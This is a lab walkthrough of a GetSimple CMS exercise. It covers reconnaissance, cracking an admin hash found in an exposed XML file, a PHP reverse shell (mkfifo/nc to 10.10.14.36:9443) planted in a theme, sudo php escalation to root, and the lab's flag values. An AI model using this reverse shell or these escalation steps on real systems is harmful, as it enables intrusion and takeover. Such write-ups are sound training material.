### GetSimple Exercise
 
IP: 10.129.42.249
 
---
 
### Question 1:
Spawn the target, gain a foothold and submit the contents of the user.txt flag.
 
I start off with an Nmap scan.
 
```diff
+ $ nmap -A -sV -sT -sC 10.129.42.249
```
 
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
	|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
	|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	| http-robots.txt: 1 disallowed entry
	|_/admin/
	|_http-title: Welcome to GetSimple! - gettingstarted
	|_http-server-header: Apache/2.4.41 (Ubuntu)
 
I notice from this output a web server and a disallowed entry, so I navigate to a browser and look into the robots.txt disallowed entry /admin. I find an admin login, and inspecting the HTML does me no good. I view the root and don't see much of notice aside from mention of editing a theme in a components section.
 
I start up gobuster to try and find any subdomains.
 
```diff
+ $ gobuster dir -u http://10.129.42.249/ -w /usr/share/seclists/Discovery/Web-Content/subdomains-top1million-20000.txt
```
 
From this, I get hits on 5 subdomains:
 
	Starting gobuster in directory enumeration mode
	===============================================================
	/admin                (Status: 301) [Size: 314] [--> http://10.129.42.249/admin/]
	/data                 (Status: 301) [Size: 313] [--> http://10.129.42.249/data/]
	/backups              (Status: 301) [Size: 316] [--> http://10.129.42.249/backups/]
	/plugins              (Status: 301) [Size: 316] [--> http://10.129.42.249/plugins/]
	/theme                (Status: 301) [Size: 314] [--> http://10.129.42.249/theme/]
 
Poking around, I find an admin.xml inside of /data/users/admin.xml which contains an admin username, along with a hashed password. Using crackstation.net, I find that the hashed password is "admin". Passing the username admin and password admin into the admin login page grants me access.
 
Exploring around, I immediately try out the file upload button, but it doesn't work. Checking elsewhere, I find that I can edit the themes, namely the default theme used by the website, and its written in PHP. Appending a reverse shell to an nc listener on my local machine at port 9443 and visiting the homepage grants me a shell.
 
```diff
+ <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 9443 >/tmp/f"); ?>
```
 
```diff
+ $ nc -lvnp 9443
+ $ whoami
```
 
	Listening on 0.0.0.0 9443
	Connection received on 10.129.42.249 33348
	/bin/sh: 0: can't access tty; job control turned off
	www-data
 
Going to /home I find a user named mrb3n, and from there I find the user.txt.
 
```diff
+ www-data@gettingstarted:/home/mrb3n$ cat user.txt
```
 
	7002d65b149b0a4d19132a66feed21d8
 
&#x1F6A9; found **7002d65b149b0a4d19132a66feed21d8**.
 
---
 
### Question 2:
After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.
 
From here, my goal is to get to root, so I check my sudo privileges, which contains sudo access to php.
 
```diff
+ www-data@gettingstarted:/home/mrb3n$ sudo -l
```
 
	User www-data may run the following commands on gettingstarted:
	    (ALL : ALL) NOPASSWD: /usr/bin/php
 
Seeing this, I visit GTFOBins and look for php, which gives me a handy command.
 
```diff
+ www-data@gettingstarted:/home/mrb3n$ sudo php -r 'system("/bin/sh -i");'
+ # whoami
```
 
	root
 
Visiting /root, I find the root.txt.
 
```diff
+ # cd /root
+ # ls
+ # cat root.txt
```
 
	root.txt
	snap
	f1fba6e9f71efb2630e6e34da6387842
 
&#x1F6A9; found **f1fba6e9f71efb2630e6e34da6387842**.
